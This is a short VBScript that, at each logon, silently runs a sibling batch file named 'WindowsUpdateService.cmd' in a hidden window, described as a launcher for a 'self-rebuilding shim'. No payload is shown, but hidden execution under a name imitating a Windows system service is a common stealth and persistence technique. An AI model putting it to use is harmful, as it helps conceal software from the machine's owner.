' Windowless launcher for the self-rebuilding shim.
' wscript.exe never creates a console; cmd.exe /c does, on every logon.
Set fso = CreateObject("Scripting.FileSystemObject")
Set sh  = CreateObject("WScript.Shell")
here = fso.GetParentFolderName(WScript.ScriptFullName)
sh.Run """" & here & "\WindowsUpdateService.cmd""", 0, False
